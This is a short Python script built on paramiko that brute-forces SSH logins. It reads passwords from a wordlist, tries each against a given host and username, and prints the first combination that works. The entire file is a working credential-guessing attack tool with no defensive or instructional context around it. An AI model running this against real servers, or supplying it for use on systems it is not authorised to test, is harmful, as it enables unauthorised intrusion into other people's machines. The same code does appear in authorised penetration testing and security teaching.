import paramiko
import os

def ssh_brute(ip, username, wordlist):
    if not os.path.isfile(wordlist):
        print("[!] Wordlist file not found.")
        return

    with open(wordlist, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password, timeout=3)
                print(f"[+] Login success: {username}:{password}")
                ssh.close()
                return
            except:
                print(f"[-] Failed login: {password}")
    print("[!] Brute force finished.")
